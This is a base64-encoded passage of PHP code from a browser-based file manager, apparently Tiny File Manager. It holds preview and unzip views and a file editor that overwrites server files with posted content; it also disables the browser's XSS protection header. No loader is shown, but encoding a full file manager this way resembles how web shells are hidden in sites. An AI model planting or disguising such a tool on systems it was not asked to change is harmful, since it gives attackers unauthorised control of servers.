ICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBjbGFzcz0iZC1pbmxpbmUgbXMtMiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1bnppcCIgdmFsdWU9Ijw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWxpbmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUgZnctYm9sZCBwLTAiIHN0eWxlPSJmb250LXNpemU6IDE0cHg7Ij48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdVblppcCcpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDwvZm9ybT4mbmJzcDsNCiAgICAgICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBjbGFzcz0iZC1pbmxpbmUgbXMtMiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1bnppcCIgdmFsdWU9Ijw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9mb2xkZXIiIHZhbHVlPSIxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1saW5rIHRleHQtZGVjb3JhdGlvbi1ub25lIGZ3LWJvbGQgcC0wIiBzdHlsZT0iZm9udC1zaXplOiAxNHB4OyIgdGl0bGU9IlVuWmlwIHRvIDw/cGhwIGVjaG8gZm1fZW5jKCR6aXBfbmFtZSkgPz4iPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VuWmlwVG9Gb2xkZXInKSA/PjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+Jm5ic3A7DQogICAgICAgICAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkaXNfdGV4dCAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgPGIgY2xhc3M9Im1zLTIiPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDtlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiIgY2xhc3M9ImVkaXQtZmlsZSI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0VkaXQnKSA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9hPjwvYj4gJm5ic3A7DQogICAgICAgICAgICAgICAgICAgIDxiIGNsYXNzPSJtcy0yIj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEgpKSA/PiZhbXA7ZWRpdD08P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZSkgPz4mZW52PWFjZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iZWRpdC1maWxlIj48aSBjbGFzcz0iZmEgZmEtcGVuY2lsLXNxdWFyZS1vIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdBZHZhbmNlZEVkaXRvcicpID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2E+PC9iPiAmbmJzcDsNCiAgICAgICAgICAgICAgICA8P3BocCB9ID8+DQogICAgICAgICAgICAgICAgPGIgY2xhc3M9Im1zLTIiPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+Ij48aSBjbGFzcz0iZmEgZmEtY2hldnJvbi1jaXJjbGUtbGVmdCBnby1iYWNrIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdCYWNrJykgPz48L2E+PC9iPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgaWYoJGlzX29ubGluZVZpZXdlcikgew0KICAgICAgICAgICAgICAgIGlmKCRvbmxpbmVfdmlld2VyID09ICdnb29nbGUnKSB7DQogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxpZnJhbWUgc3JjPSJodHRwczovL2RvY3MuZ29vZ2xlLmNvbS92aWV3ZXI/ZW1iZWRkZWQ9dHJ1ZSZobD1lbiZ1cmw9JyAuIGZtX2VuYygkZmlsZV91cmwpIC4gJyIgZnJhbWVib3JkZXI9Im5vIiBzdHlsZT0id2lkdGg6MTAwJTttaW4taGVpZ2h0OjQ2MHB4Ij48L2lmcmFtZT4nOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZigkb25saW5lX3ZpZXdlciA9PSAnbWljcm9zb2Z0Jykgew0KICAgICAgICAgICAgICAgICAgICBlY2hvICc8aWZyYW1lIHNyYz0iaHR0cHM6Ly92aWV3Lm9mZmljZWFwcHMubGl2ZS5jb20vb3AvZW1iZWQuYXNweD9zcmM9JyAuIGZtX2VuYygkZmlsZV91cmwpIC4gJyIgZnJhbWVib3JkZXI9Im5vIiBzdHlsZT0id2lkdGg6MTAwJTttaW4taGVpZ2h0OjQ2MHB4Ij48L2lmcmFtZT4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZWlmICgkaXNfemlwKSB7DQogICAgICAgICAgICAgICAgLy8gWklQIGNvbnRlbnQNCiAgICAgICAgICAgICAgICBpZiAoJGZpbGVuYW1lcyAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGNvZGUgY2xhc3M9Im1heGhlaWdodCI+JzsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVuYW1lcyBhcyAkZm4pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZm5bJ2ZvbGRlciddKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPGI+JyAuIGZtX2VuYygkZm5bJ25hbWUnXSkgLiAnPC9iPjxicj4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICRmblsnbmFtZSddIC4gJyAoJyAuIGZtX2dldF9maWxlc2l6ZSgkZm5bJ2ZpbGVzaXplJ10pIC4gJyk8YnI+JzsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlY2hvICc8L2NvZGU+JzsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBlY2hvICc8cD4nLmxuZygnRXJyb3Igd2hpbGUgZmV0Y2hpbmcgYXJjaGl2ZSBpbmZvJykuJzwvcD4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZWlmICgkaXNfaW1hZ2UpIHsNCiAgICAgICAgICAgICAgICAvLyBJbWFnZSBjb250ZW50DQogICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRleHQsIGFycmF5KCdnaWYnLCAnanBnJywgJ2pwZWcnLCAncG5nJywgJ2JtcCcsICdpY28nLCAnc3ZnJywgJ3dlYnAnLCAnYXZpZicpKSkgew0KICAgICAgICAgICAgICAgICAgICBlY2hvICc8cD48aW5wdXQgdHlwZT0iY2hlY2tib3giIGlkPSJwcmV2aWV3LWltZy16b29tQ2hlY2siPjxsYWJlbCBmb3I9InByZXZpZXctaW1nLXpvb21DaGVjayI+PGltZyBzcmM9IicgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICciIGFsdD0iaW1hZ2UiIGNsYXNzPSJwcmV2aWV3LWltZyI+PC9sYWJlbD48L3A+JzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2VpZiAoJGlzX2F1ZGlvKSB7DQogICAgICAgICAgICAgICAgLy8gQXVkaW8gY29udGVudA0KICAgICAgICAgICAgICAgIGVjaG8gJzxwPjxhdWRpbyBzcmM9IicgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICciIGNvbnRyb2xzIHByZWxvYWQ9Im1ldGFkYXRhIj48L2F1ZGlvPjwvcD4nOw0KICAgICAgICAgICAgfSBlbHNlaWYgKCRpc192aWRlbykgew0KICAgICAgICAgICAgICAgIC8vIFZpZGVvIGNvbnRlbnQNCiAgICAgICAgICAgICAgICBlY2hvICc8ZGl2IGNsYXNzPSJwcmV2aWV3LXZpZGVvIj48dmlkZW8gc3JjPSInIC4gZm1fZW5jKCRmaWxlX3VybCkgLiAnIiB3aWR0aD0iNjQwIiBoZWlnaHQ9IjM2MCIgY29udHJvbHMgcHJlbG9hZD0ibWV0YWRhdGEiPjwvdmlkZW8+PC9kaXY+JzsNCiAgICAgICAgICAgIH0gZWxzZWlmICgkaXNfdGV4dCkgew0KICAgICAgICAgICAgICAgIGlmIChGTV9VU0VfSElHSExJR0hUSlMpIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gaGlnaGxpZ2h0DQogICAgICAgICAgICAgICAgICAgICRobGpzX2NsYXNzZXMgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICdzaHRtbCcgPT4gJ3htbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAnaHRhY2Nlc3MnID0+ICdhcGFjaGUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3BodG1sJyA9PiAncGhwJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdsb2NrJyA9PiAnanNvbicsDQogICAgICAgICAgICAgICAgICAgICAgICAnc3ZnJyA9PiAneG1sJywNCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgJGhsanNfY2xhc3MgPSBpc3NldCgkaGxqc19jbGFzc2VzWyRleHRdKSA/ICdsYW5nLScgLiAkaGxqc19jbGFzc2VzWyRleHRdIDogJ2xhbmctJyAuICRleHQ7DQogICAgICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkZXh0KSB8fCBpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlKSwgZm1fZ2V0X3RleHRfbmFtZXMoKSkgfHwgcHJlZ19tYXRjaCgnI1wubWluXC4oY3NzfGpzKSQjaScsICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGhsanNfY2xhc3MgPSAnbm9oaWdobGlnaHQnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRjb250ZW50ID0gJzxwcmUgY2xhc3M9IndpdGgtaGxqcyI+PGNvZGUgY2xhc3M9IicgLiAkaGxqc19jbGFzcyAuICciPicgLiBmbV9lbmMoJGNvbnRlbnQpIC4gJzwvY29kZT48L3ByZT4nOw0KICAgICAgICAgICAgICAgIH0gZWxzZWlmIChpbl9hcnJheSgkZXh0LCBhcnJheSgncGhwJywgJ3BocDQnLCAncGhwNScsICdwaHRtbCcsICdwaHBzJykpKSB7DQogICAgICAgICAgICAgICAgICAgIC8vIHBocCBoaWdobGlnaHQNCiAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBoaWdobGlnaHRfc3RyaW5nKCRjb250ZW50LCB0cnVlKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9ICc8cHJlPicgLiBmbV9lbmMoJGNvbnRlbnQpIC4gJzwvcHJlPic7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVjaG8gJGNvbnRlbnQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICA/Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICA8P3BocA0KICAgICAgICBmbV9zaG93X2Zvb3RlcigpOw0KICAgIGV4aXQ7DQp9DQoNCi8vIGZpbGUgZWRpdG9yDQppZiAoaXNzZXQoJF9HRVRbJ2VkaXQnXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgJGZpbGUgPSAkX0dFVFsnZWRpdCddOw0KICAgICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSwgZmFsc2UpOw0KICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOw0KICAgIGlmICgkZmlsZSA9PSAnJyB8fCAhaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSB8fCAhZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgbm90IGZvdW5kJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQogICAgfQ0KICAgICRlZGl0RmlsZSA9ICcgOiA8aT48Yj4nLiAkZmlsZS4gJzwvYj48L2k+JzsNCiAgICBoZWFkZXIoJ1gtWFNTLVByb3RlY3Rpb246MCcpOw0KICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KDQogICAgJGZpbGVfdXJsID0gRk1fUk9PVF9VUkwgLiBmbV9jb252ZXJ0X3dpbigoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZmlsZSk7DQogICAgJGZpbGVfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJGZpbGU7DQoNCiAgICAvLyBub3JtYWwgZWRpdGVyDQogICAgJGlzTm9ybWFsRWRpdG9yID0gdHJ1ZTsNCiAgICBpZiAoaXNzZXQoJF9HRVRbJ2VudiddKSkgew0KICAgICAgICBpZiAoJF9HRVRbJ2VudiddID09ICJhY2UiKSB7DQogICAgICAgICAgICAkaXNOb3JtYWxFZGl0b3IgPSBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIFNhdmUgRmlsZQ0KICAgIGlmIChpc3NldCgkX1BPU1RbJ3NhdmVkYXRhJ10pKSB7DQogICAgICAgICR3cml0ZWRhdGEgPSAkX1BPU1RbJ3NhdmVkYXRhJ107DQogICAgICAgICRmZCA9IGZvcGVuKCRmaWxlX3BhdGgsICJ3Iik7DQogICAgICAgIEBmd3JpdGUoJGZkLCAkd3JpdGVkYXRhKTsNCiAgICAgICAgZmNsb3NlKCRmZCk7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIFNhdmVkIFN1Y2Nlc3NmdWxseScpKTsNCiAgICB9DQoNCiAgICAkZXh0ID0gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZV9wYXRoLCBQQVRISU5GT19FWFRFTlNJT04pKTsNCiAgICAkbWltZV90eXBlID0gZm1fZ2V0X21pbWVfdHlwZSgkZmlsZV9wYXRoKTsNCiAgICAkZmlsZXNpemUgPSBmaWxlc2l6ZSgkZmlsZV9wYXRoKTsNCiAgICAkaXNfdGV4dCA9IGZhbHNlOw0KICAgICRjb250ZW50ID0gJyc7IC8vIGZvciB0ZXh0DQoNCiAgICBpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X3RleHRfZXh0cygpKSB8fCBzdWJzdHIoJG1pbWVfdHlwZSwgMCwgNCkgPT0gJ3RleHQnIHx8IGluX2FycmF5KCRtaW1lX3R5cGUsIGZtX2dldF90ZXh0X21pbWVzKCkpKSB7DQogICAgICAgICRpc190ZXh0ID0gdHJ1ZTsNCiAgICAgICAgJGNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsNCiAgICB9DQoNCiAgICA/Pg0KICAgIDxkaXYgY2xhc3M9InBhdGgiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS01IGNvbC1sZy02IHB0LTEiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi10b29sYmFyIiByb2xlPSJ0b29sYmFyIj4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCEkaXNOb3JtYWxFZGl0b3IpIHsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBqcy1hY2UtdG9vbGJhciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBkYXRhLWNtZD0ibm9uZSIgZGF0YS1vcHRpb249ImZ1bGxzY3JlZW4iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXNlY29uZGFyeSIgaWQ9ImpzLWFjZS1mdWxsc2NyZWVuIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0Z1bGxzY3JlZW4nKSA/PiI+PGkgY2xhc3M9ImZhIGZhLWV4cGFuZCIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdGdWxsc2NyZWVuJykgPz4iPjwvaT48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJmaW5kIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1zZWNvbmRhcnkiIGlkPSJqcy1hY2Utc2VhcmNoIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1NlYXJjaCcpID8+Ij48aSBjbGFzcz0iZmEgZmEtc2VhcmNoIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1NlYXJjaCcpID8+Ij48L2k+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBkYXRhLWNtZD0idW5kbyIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLXVuZG8iIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnVW5kbycpID8+Ij48aSBjbGFzcz0iZmEgZmEtdW5kbyIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdVbmRvJykgPz4iPjwvaT48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJyZWRvIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1zZWNvbmRhcnkiIGlkPSJqcy1hY2UtcmVkbyIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdSZWRvJykgPz4iPjxpIGNsYXNzPSJmYSBmYS1yZXBlYXQiIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnUmVkbycpID8+Ij48L2k+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBkYXRhLWNtZD0ibm9uZSIgZGF0YS1vcHRpb249IndyYXAiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXNlY29uZGFyeSIgaWQ9ImpzLWFjZS13b3JkV3JhcCIgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdXb3JkIFdyYXAnKSA/PiI+PGkgY2xhc3M9ImZhIGZhLXRleHQtd2lkdGgiIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnV29yZCBXcmFwJykgPz4iPjwvaT48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGlkPSJqcy1hY2UtbW9kZSIgZGF0YS10eXBlPSJtb2RlIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1NlbGVjdCBEb2N1bWVudCBUeXBlJykgPz4iIGNsYXNzPSJidG4tb3V0bGluZS1zZWNvbmRhcnkgYm9yZGVyLXN0YXJ0LTAgZC1ub25lIGQtbWQtYmxvY2siPjxvcHRpb24+LS0gPD9waHAgZWNobyBsbmcoJ1NlbGVjdCBNb2RlJykgPz4gLS08L29wdGlvbj48L3NlbGVjdD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGlkPSJqcy1hY2UtdGhlbWUiIGRhdGEtdHlwZT0idGhlbWUiIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnU2VsZWN0IFRoZW1lJykgPz4iIGNsYXNzPSJidG4tb3V0bGluZS1zZWNvbmRhcnkgYm9yZGVyLXN0YXJ0LTAgZC1ub25lIGQtbGctYmxvY2siPjxvcHRpb24+LS0gPD9waHAgZWNobyBsbmcoJ1NlbGVjdCBUaGVtZScpID8+IC0tPC9vcHRpb24+PC9zZWxlY3Q+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBpZD0ianMtYWNlLWZvbnRTaXplIiBkYXRhLXR5cGU9ImZvbnRTaXplIiB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1NlbGVjdCBGb250IFNpemUnKSA/PiIgY2xhc3M9ImJ0bi1vdXRsaW5lLXNlY29uZGFyeSBib3JkZXItc3RhcnQtMCBkLW5vbmUgZC1sZy1ibG9jayI+PG9wdGlvbj4tLSA8P3BocCBlY2hvIGxuZygnU2VsZWN0IEZvbnQgU2l6ZScpID8+IC0tPC9vcHRpb24+PC9zZWxlY3Q+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgfSA/Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJlZGl0LWZpbGUtYWN0aW9ucyBjb2wteHMtMTIgY29sLXNtLTcgY29sLWxnLTYgdGV4dC1lbmQgcHQtMSI+DQogICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdCYWNrJykgPz4iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDt2aWV3PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiI+PGkgY2xhc3M9ImZhIGZhLXJlcGx5LWFsbCI+PC9pPiA8P3BocCBlY2hvIGxuZygnQmFjaycpID8+PC9hPg0KICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnQmFja1VwJykgPz4iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKTsiIG9uY2xpY2s9ImJhY2t1cCgnPD9waHAgZWNobyB1cmxlbmNvZGUodHJpbShGTV9QQVRIKSkgPz4nLCc8P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZSkgPz4nKSI+PGkgY2xhc3M9ImZhIGZhLWRhdGFiYXNlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdCYWNrVXAnKSA/PjwvYT4NCiAgICAgICAgICAgICAgICA8P3BocCBpZiAoJGlzX3RleHQpIHsgPz4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCRpc05vcm1hbEVkaXRvcikgeyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9IkFkdmFuY2VkIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1wcmltYXJ5IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEgpKSA/PiZhbXA7ZWRpdD08P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZSkgPz4mYW1wO2Vudj1hY2UiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwtc3F1YXJlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ0FkdmFuY2VkRWRpdG9yJykgPz48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXN1Y2Nlc3MiIG5hbWU9IlNhdmUiIGRhdGEtdXJsPSI8P3BocCBlY2hvIGZtX2VuYygkZmlsZV91cmwpID8+IiBvbmNsaWNrPSJlZGl0X3NhdmUodGhpcywnbnJsJykiPjxpIGNsYXNzPSJmYSBmYS1mbG9wcHktbyI+PC9pPiBTYXZlDQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgfSBlbHNlIHsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSJQbGFpbiBFZGl0b3IiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDtlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiI+PGkgY2xhc3M9ImZhIGZhLXRleHQtaGVpZ2h0Ij48L2k+IDw/cGhwIGVjaG8gbG5nKCdOb3JtYWxFZGl0b3InKSA/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tc3VjY2VzcyIgbmFtZT0iU2F2ZSIgZGF0YS11cmw9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmaWxlX3VybCkgPz4iIG9uY2xpY2s9ImVkaXRfc2F2ZSh0aGlzLCdhY2UnKSI+PGkgY2xhc3M9ImZhIGZhLWZsb3BweS1vIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdTYXZlJykgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCB9ID8+DQogICAgICAgICAgICAgICAgPD9waHAgfSA/Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8P3BocA0KICAgICAgICBpZiAoJGlzX3RleHQgJiYgJGlzTm9ybWFsRWRpdG9yKSB7DQogICAgICAgICAgICBlY2hvICc8dGV4dGFyZWEgY2xhc3M9Im10LTIiIGlkPSJub3JtYWwtZWRpdG9yIiByb3dzPSIzMyIgY29scz0iMTIwIiBzdHlsZT0id2lkdGg6IDk5LjUlOyI+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQpIC4gJzwvdGV4dGFyZWE+JzsNCiAgICAgICAgICAgIGVjaG8gJzxzY3JpcHQ+ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGUpIHtpZiAoKHdpbmRvdy5uYXZpZ2F0b3IucGxhdGZvcm0ubWF0Y2goIk1hYyIpID8gZS5tZXRhS2V5IDogZS5jdHJsS2V5KSAgJiYgZS5rZXlDb2RlID09IDgzKSB7IGUucHJldmVudERlZmF1bHQoKTtlZGl0X3NhdmUodGhpcywibnJsIik7fX0sIGZhbHNlKTs8L3NjcmlwdD4nOw0KICAgICAgICB9IGVsc2VpZiAoJGlzX3RleHQpIHsNCiAgICAgICAgICAgIGVjaG8gJzxkaXYgaWQ9ImVkaXRvciIgY29udGVudGVkaXRhYmxlPSJ0cnVlIj4nIC4gaHRtbHNwZWNpYWxjaGFycygkY29udGVudCkgLiAnPC9kaXY+JzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdGSUxFIEVYVEVOU0lPTiBIQVMgTk9UIFNVUFBPUlRFRCcpLCAnZXJyb3InKTsNCiAgICAgICAgfQ0KICAgICAgICA/Pg0KICAgIDwvZGl2Pg0KICAgIDw/cGhwDQogICAgZm1fc2hvd19mb290ZXIoKTsNCiAgICBleGl0Ow0KfQ0KDQovLyBjaG1vZCAobm90IGZvciBXaW5kb3dzKQ0KaWYgKGlzc2V0KCRfR0VUWydjaG1vZCddKSAmJiAhRk1fUkVBRE9OTFkgJiYgIUZNX0lTX1dJTikgew0KICAgICRmaWxlID0gJF9HRVRbJ2NobW9kJ107DQogICAgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlKTsNCiAgICAkZmlsZSA9IHN0cl9yZXBsYWNlKCcvJywgJycsICRmaWxlKTsNCiAgICBpZiAoJGZpbGUgPT0gJycgfHwgKCFpc19maWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpICYmICFpc19kaXIoJHBhdGggLiAnLycgLiAkZmlsZSkpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICAgICAgJEZNX1BBV